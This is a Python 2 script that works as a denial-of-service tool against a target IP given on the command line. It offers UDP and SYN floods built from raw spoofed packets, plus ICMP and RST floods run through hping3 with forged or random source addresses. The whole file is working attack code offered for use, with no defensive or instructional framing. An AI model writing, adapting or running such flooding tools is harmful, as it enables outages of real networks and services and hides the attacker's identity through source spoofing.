from socket import *
import time
import sys
import random
import os
from struct import *
#ABCDEFGHIJKL COMMENT


def UDPflood(target,port,duration):
	try:
		c=socket(AF_INET,SOCK_DGRAM)
	except error ,s:
		print "Socket couldn't be created"+ s
		sys.exit()
	packetsize=random._urandom(1024)
	endtime = time.time() + duration

	count = 0

	while 1:
		if time.time()>endtime:
			break
		else:
			c.sendto(packetsize, (target,port))
        	count=count+1
        	print "Packet %s sent to %s, port %s"%(count,target, port)





def SYNflood(target,duration):
	
	count=0
	try:
		s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
	except error , msg:
		print "Socket couldn't be created",msg
		sys.exit()


	source_ip='55.55.55.55'
	dest_ip=target
	
	ip_hl = 5
	ip_ver = 4
	ip_typeofserivce = 0
	ip_totallength = 0  
	ip_id = 54321 
	ip_frag_off = 0
	ip_ttl = 255
	ip_proto = IPPROTO_TCP
	ip_checksum = 0    
	ip_source = inet_aton ( source_ip )   
	ip_dest= inet_aton ( dest_ip )
 
	ip_hl_ver = (ip_ver << 4) + ip_hl
 

	ip_header = pack('!BBHHHBBH4s4s' , ip_hl_ver, ip_typeofserivce, ip_totallength, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_checksum, ip_source, ip_dest)


	tcp_source = 65500   
	tcp_dest = 80   
	tcp_ack = 0
	tcp_seq = 454
	tcp_fin = 0
	tcp_ack_seq = 0
	tcp_doff = 5    
	tcp_syn = 1
	tcp_rst = 0
	tcp_psh = 0
	tcp_pshack = 0
	tcp_urg = 0
	tcp_window = htons (5840)   
	tcp_check = 0
	tcp_urg_ptr = 0
	tcp_offset_res = (tcp_doff << 4) + 0
	tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

	tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
 
	user_data = "Turn on your firewall"

	source_address = inet_aton( source_ip )
	dest_address = inet_aton(dest_ip)
	placeholder = 0
	protocol = IPPROTO_TCP
	tcp_length = len(tcp_header) + len(user_data)
	 
	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
	psh = psh + tcp_header + user_data;
	tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
	 
	
	packet = ip_header + tcp_header + user_data
	count = 0

	endtime=time.time()+duration
	while(1):
	    
	    if(time.time() >endtime):
	    	break
	    else:
	    	pass
	    s.sendto(packet, (dest_ip , 0 ))
	    count = count + 1
	    print "Sent SYN packet # %s to %s"%(count,target)
	    #time.sleep(1)


    	

def main():


	mydict={'destip':sys.argv[2]}

	if len(sys.argv)!=5:
		print " [type] [target IP] [port(for UDP)] [duration(for UDP)]: \n"
		sys.exit()
	if sys.argv[1] ==  'udp':
		UDPflood(sys.argv[2],int(sys.argv[3]),int(sys.argv[4]))
	elif sys.argv[1] == 'syn':
		SYNflood(sys.argv[2],int(sys.argv[4]))
	elif sys.argv[1] == 'icmp':
		os.system("hping3 -1 --flood -a 55.55.55.55 {destip}".format(**mydict))
	elif sys.argv[1] == 'rst':
		os.system("hping3 --flood --rand-source -R -p 5555 {destip}".format(**mydict))





if __name__=='__main__':
	main()

	
